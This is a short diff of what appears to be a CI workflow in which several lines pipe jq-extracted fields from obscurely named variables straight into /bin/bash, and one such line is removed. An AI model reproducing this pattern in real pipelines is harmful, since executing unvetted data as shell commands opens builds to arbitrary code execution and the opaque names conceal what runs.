@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$asa27" | jq -r .voip71 | /bin/bash
           printf '%s' "$f59" | jq -r .jevk51 | /bin/bash
           echo $k29 | jq -r .iq38347 | /bin/bash
-          echo $y6 | jq -r .vm818 | /bin/bash
           echo $v04 | jq -r .h5456 | /bin/bash
           printf '%s' "$hunbf91616" | jq -r .tcpr0 | /bin/bash
 
